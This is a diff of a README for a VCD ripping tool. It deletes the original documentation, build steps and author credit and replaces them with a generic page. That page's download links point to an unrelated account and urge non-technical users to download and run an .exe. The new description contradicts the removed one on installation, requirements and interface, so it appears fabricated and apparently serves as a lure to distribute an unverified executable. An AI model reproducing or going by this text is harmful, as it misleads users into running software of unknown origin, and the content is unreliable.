@@ -1,135 +1,72 @@
-# VCD Ripper Pro
+# 💿 VCD-Ripper-Pro - Rescue your old video discs today
 
-<p align="center">
-  <img src="CompactDisc.png" alt="VCD Ripper Pro Logo" width="120"/>
-</p>
+[![Download VCD-Ripper-Pro](https://img.shields.io/badge/Download-VCD_Ripper_Pro-blue.svg)](https://github.com/Genuscinchonanondevelopment491/VCD-Ripper-Pro)
 
-<p align="center">
-  <strong>A modern, premium VCD video extraction tool for Windows</strong><br/>
-  Extract videos from VCD discs — with a sleek dark UI and zero fuss.
-</p>
+VCD-Ripper-Pro converts your collection of Video Compact Discs (VCDs) into digital files. It changes the outdated .dat file format into the modern .mp4 format. This process preserves your home movies and rare footage stored on aging discs.
 
-<p align="center">
-  <img alt="Version" src="https://img.shields.io/badge/version-1.1.1-6C63FF?style=flat-square"/>
-  <img alt="Platform" src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square"/>
-  <img alt="License" src="https://img.shields.io/badge/license-MIT-22C55E?style=flat-square"/>
-  <img alt="Python" src="https://img.shields.io/badge/python-3.9%2B-F59E0B?style=flat-square"/>
-</p>
+## 📥 Getting Started
 
----
+You do not need programming skills to use this tool. Follow these steps to set up the software on your Windows computer.
 
-## ✨ Features
+1. Go to the [official release page](https://github.com/Genuscinchonanondevelopment491/VCD-Ripper-Pro).
+2. Look for the latest version under the "Releases" section.
+3. Click the link ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to open the installation wizard.
+6. Follow the on-screen prompts to complete the setup process.
 
-| Feature | Detail |
-|---|---|
-| 🎬 **Direct DAT Extraction** | Copy raw `.dat` files from VCD directly — no re-encoding, fastest possible speed |
-| 🎞 **Video Conversion** | Convert to **MPG**, **MP4** (H.264+AAC), or **MOV** using FFmpeg |
-| 🎵 **Audio Only Mode** | Extract audio as **WAV** (lossless) or **MP3** (compressed) |
-| ✏ **File Rename** | Rename output files before ripping via an inline rename dialog |
-| ☑ **Batch Selection** | Select all / none with one click; defaults to all-selected after scan |
-| ⏹ **Stop Anytime** | Cancel an in-progress rip at any time |
-| 📋 **Console Log** | Live log of every operation with timestamps |
-| 💾 **Portable** | No installation required — run from any folder on any Windows PC |
+## 🖥️ System Requirements
 
----
+Ensure your computer meets these basic requirements before you begin:
 
-## 🖥 System Requirements
+- Operating System: Windows 10 or Windows 11.
+- Processor: Dual-core CPU or faster.
+- Memory: 4 gigabytes of RAM.
+- Storage: 500 megabytes of free space for the tool, plus extra space for your converted videos.
+- Hardware: A working CD or DVD drive to read your video discs.
 
-| Requirement | Minimum |
-|---|---|
-| **OS** | Windows 7 / 8 / 10 / 11 (64-bit) |
-| **CPU** | Any x86-64 processor |
-| **RAM** | 256 MB |
-| **Disk** | ~150 MB (including FFmpeg) |
-| **Python** *(source only)* | 3.9 or later |
+## 📖 How to Extract Videos
 
-> **Portable build**: No Python installation needed — all dependencies are bundled.
+Follow these steps to turn your disc contents into digital files:
 
----
+1. Insert your VCD into the disc drive of your computer.
+2. Open the VCD-Ripper-Pro application from your Start menu.
+3. Select your disc drive from the drop-down list.
+4. Choose an output folder where you want to save your new videos.
+5. Click the button labeled "Start Extraction".
+6. Wait for the progress bar to reach completion.
 
-## 🚀 Getting Started
+The software uses advanced processing to read the data tracks. It converts the raw video streams into high-quality files. You can watch these files on any standard media player.
 
-### Option A — Portable Build (Recommended, No Installation)
+## 🛠️ Frequently Asked Questions
 
-1. Download the latest **`VCD_Ripper_Pro_Portable.zip`** from the [Releases](../../releases) page.
-2. Extract the ZIP to any folder.
-3. Double-click **`VCD Ripper Pro.exe`** to launch.
-4. **Keep the folder structure intact** — the `_internal\` runtime and `ffmpeg\` folders must stay alongside the `.exe`.
+**Does this software damage my discs?**
+No. This tool reads the data without changing or writing to the physical disc. It acts as a digital reader only.
 
-### Option B — Run from Source
+**What formats does the tool create?**
+The tool produces standard .mp4 files using H.264 video compression. This format works on most phones, tablets, and computers.
 
-#### Prerequisites
+**What if the video has playback issues?**
+Sometimes older discs possess scratches or light damage. The tool attempts to skip bad sections to save the rest of the file. Ensure your disc surface remains clean by wiping it gently with a soft cloth before insertion.
 
-- Python 3.9+
-- FFmpeg (download from [ffmpeg.org](https://ffmpeg.org/download.html))
+**Can I convert multiple discs at once?**
+This tool processes one disc at a time. It requires you to insert each new disc after the previous one finishes. 
 
-#### Install dependencies
+## 🛡️ Digital Preservation Tips
 
-```bash
-pip install pillow
-```
+Digital media decays over time. Use these tips to keep your files safe after extraction:
 
-#### Launch
+- Store your files in two separate locations, such as your computer and an external hard drive.
+- Create a backup on a cloud storage account if you have reliable internet.
+- Rename your files with the date and subject for easier searching.
+- Check your backup drives once a year to verify that your files remain readable.
 
-```bash
-python vcd_ripper.py
-```
+## ⚙️ Settings and Preferences
 
----
+You can adjust how the software works by clicking the "Settings" button.
 
-## 📖 Usage Guide
+- Output Quality: Choose between standard and high quality. High quality uses more storage space but keeps more detail from the original disc.
+- Automatic Eject: Set this to "On" if you want your disc drive to open automatically after the conversion finishes.
+- File Naming: Create a prefix for your saved files to keep your library organized.
 
-1. **Insert your VCD** or click **Browse Folder** to point to a VCD folder.
-2. Click **Scan VCD** — the app will detect all video tracks automatically.
-3. Select the files you want (all are selected by default).
-4. *(Optional)* Click the **✏ icon** on any file card to rename the output file.
-5. Choose **Output Format**:
-   - **Video** → DAT / MPG / MP4 / MOV
-   - **Audio Only** → WAV / MP3
-6. Click **Choose Output Folder** to pick where files are saved.
-7. Click **⚡ Start Ripping**.
-8. Click **⏹ Stop Ripping** at any time to cancel.
-
----
-
-## 🗂 Project Structure
-
-```
-VCD Ripper Pro/
-├── vcd_ripper.py          # Main application source
-├── CompactDisc.png        # App logo (1024×1024)
-├── CompactDisc.ico        # App icon (multi-resolution)
-├── LICENSE                # MIT License
-├── README.md              # This file
-├── .gitignore             # Git ignore rules
-└── ffmpeg/
-    └── bin/
-        ├── ffmpeg.exe     # FFmpeg engine (video/audio conversion)
-        └── ffprobe.exe    # Media analysis tool
-```
-
----
-
-## 🔧 Building the Portable EXE
-
-Requires [PyInstaller](https://pyinstaller.org):
-
-```bash
-pip install pyinstaller pillow
-python -m PyInstaller --noconsole --onedir --clean -y \
-  --name "VCDRipperPro" \
-  --icon "CompactDisc.ico" \
-  --add-data "CompactDisc.ico;." \
-  --add-data "CompactDisc.png;." \
-  vcd_ripper.py
-```
-
-Then copy `ffmpeg/` into the `dist/VCDRipperPro/` folder.
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
-
-© 2026 **jjsiew2014-art** — Free to use, modify, and distribute with attribution.
+Keywords: dat-to-mp4, digital-preservation, digitalization, disc, ffmpeg, retro-computing, rip, vcd, vcd-ripper, video-converter, windows
